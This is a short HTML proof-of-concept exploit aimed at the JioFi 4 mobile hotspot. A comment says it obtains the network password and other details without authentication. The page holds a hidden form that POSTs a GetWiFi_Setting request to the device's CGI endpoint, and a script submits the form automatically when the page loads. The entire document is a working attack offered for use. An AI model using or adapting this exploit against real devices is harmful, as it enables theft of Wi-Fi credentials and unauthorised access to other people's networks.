<!-- This HTML script helps in getting network password and other details from a JioFi 4 Device without required authentication.
Requires to be connected to the JioFi network. -->

<html>

<body>
    <form action="http://jiofi.local.html/cgi-bin/qcmap_web_cgi" method="POST">
        <input type="hidden" name="Page" value="GetWiFi&#95;Setting" />
        <input type="hidden" name="Mask" value="0" />
        <input type="hidden" name="result" value="0" />
        <input type="submit" id="submitbutton" value="Submit request" style="display: none;" />
    </form>
</body>

<script>
    document.getElementById("submitbutton").click();
</script>

</html>
